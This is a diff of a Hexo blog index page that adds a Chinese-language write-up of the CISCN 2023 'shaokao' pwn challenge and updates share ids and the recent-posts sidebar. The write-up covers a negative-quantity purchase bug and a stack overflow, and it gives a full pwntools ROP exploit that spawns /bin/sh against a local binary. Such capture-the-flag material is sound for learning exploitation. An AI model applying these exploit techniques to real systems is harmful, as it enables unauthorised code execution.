@@ -64,6 +64,50 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-shaokao" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/29/shaokao/" class="article-date">
+  <time datetime="2023-05-29T13:29:01.312Z" itemprop="datePublished">2023-05-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/29/shaokao/">shaokao(ciscn2023)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="shaokao-ciscn2023"><a href="#shaokao-ciscn2023" class="headerlink" title="shaokao(ciscn2023)"></a>shaokao(ciscn2023)</h1><h2 id="对于这道题目的定义"><a href="#对于这道题目的定义" class="headerlink" title="对于这道题目的定义"></a>对于这道题目的定义</h2><p>   这是一道ret2syscall类型的题目</p>
+<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><ol>
+<li>可以发现一开始你的钱包余额为233块，买啤酒十块钱一瓶买烤串五块钱一串。<br>ida打开程序我们可以发现有一个vip函数:意思是我们可以花10000块买下整个店。<br><img src="/2023/05/29/shaokao/shaokao.png" alt="Alt text"></li>
+<li>如何买下整个店呢？你可以买啤酒或者炸串的时候在选择负号+数字瓶或者串就能够获得相应的钱了。我们可以用这个方法把整个烧烤摊买下来。</li>
+<li>把烧烤摊买下来之后我们就会发现多出了一个改名的选项，我们选择进入这个选项，这里就是我们进行栈溢出的地方了！！！</li>
+</ol>
+<h2 id="查找gadget、system的地址"><a href="#查找gadget、system的地址" class="headerlink" title="查找gadget、system的地址"></a>查找gadget、system的地址</h2><h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;-100000&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;5&quot;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x4e60f0</span></span><br><span class="line">pop_rax_rdx_rbx = <span class="number">0x4a404a</span></span><br><span class="line">#pop_rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x40264f</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x40a67e</span></span><br><span class="line">system_addr = <span class="number">0x402404</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">payload = b<span class="string">&quot;/bin/sh\x00;&quot;</span>+ b<span class="string">&quot;A&quot;</span>*<span class="number">31</span> + <span class="title function_">p64</span>(pop_rax_rdx_rbx) + <span class="title function_">p64</span>(<span class="number">0x3b</span>) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(pop_rdi_ret) + <span class="title function_">p64</span>(binsh_addr) + <span class="title function_">p64</span>(pop_rsi_ret) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(system_addr)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+<p><strong>最后的最后要注意因为我们payload中的/bin/sh是要传递给execve系统调用的参数，然而后面还跟了一大串的垃圾数据(拿来栈溢出的，这不是我们要的参数)，所以我们需要在/bin/sh跟上\x00用来进行截断才行</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="clizn4521000b78v9hpat5f6b" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-canary爆破" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/05/29/canary%E7%88%86%E7%A0%B4/" class="article-date">
@@ -115,7 +159,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="cliubbu2f000648v997k54xam" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="clizn451z000978v9e5on7ly1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -161,6 +205,10 @@
       <ul>
         
           <li>
+            <a href="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/">32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/">32位shellcode(其实是32位syscall)</a>
           </li>
         
@@ -174,10 +222,6 @@
         
           <li>
             <a href="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/">64位格式化字符串之修改返回地址</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/">32位格式化字符串之改写fini使程序反复</a>
           </li>
         
       </ul>
